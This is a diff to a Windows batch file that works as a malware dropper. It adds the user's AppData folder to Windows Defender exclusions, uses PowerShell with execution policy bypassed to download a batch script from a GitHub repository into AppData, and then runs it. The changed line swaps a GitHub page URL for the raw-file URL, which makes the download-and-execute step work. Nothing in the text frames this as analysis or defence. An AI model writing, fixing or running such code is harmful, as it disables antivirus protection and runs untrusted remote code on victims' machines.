@@ -11,5 +11,5 @@
 
 :-------------------------------0-------------=0-=0-=0-=0-=67456-------    
 call powershell.exe Add-MpPreference -ExclusionPath "%AppData%"
-call powershell.exe -ExecutionPolicy bypass -noprofile (New-Object System.Net.WebClient).DownloadFile('https://github.com/oxsve/f/blob/master/d.bat','%AppData%\dorm.bat')
+call powershell.exe -ExecutionPolicy bypass -noprofile (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/oxsve/f/master/d.bat','%AppData%\dorm.bat')
 call start %AppData%\dorm.bat
